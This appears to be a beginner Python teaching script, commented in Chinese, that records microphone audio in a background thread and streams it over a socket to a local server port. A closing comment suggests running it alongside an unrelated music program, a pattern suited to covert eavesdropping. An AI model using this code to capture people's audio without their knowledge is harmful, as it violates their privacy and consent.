from socket import *
import pyaudio, threading  # 音频模块
s = socket()
s.connect(("127.0.0.1",4321))
def send_audio():
    # 创建音频对象  音响师
    audio = pyaudio.PyAudio()
    # 打开音频输入流设置参数（，,，（声音进入），，）
    stream = audio.open(
        format=pyaudio.paInt16, #音频格式
        channels=1,             #声道
        rate=44100,             #采样率
        input=True,             #输入流
        frames_per_buffer=1024, #音频块
        input_device_index=0    #麦克风
    )
    # 流的概念 管道通路，类似电流
    # 从输入流里取出音频 发给后台
    while True:
        data = stream.read(1024)  # 输入流中把数据读取出来
        s.send(data)              # 音频可以直接发，不用编码

# 线程  让程序开分身，同时干多个事情
thread1 = threading.Thread(target=send_audio)
thread1.start()  # 线程启动
#主线程 循环执行别的功能，比如 VIP音乐.py
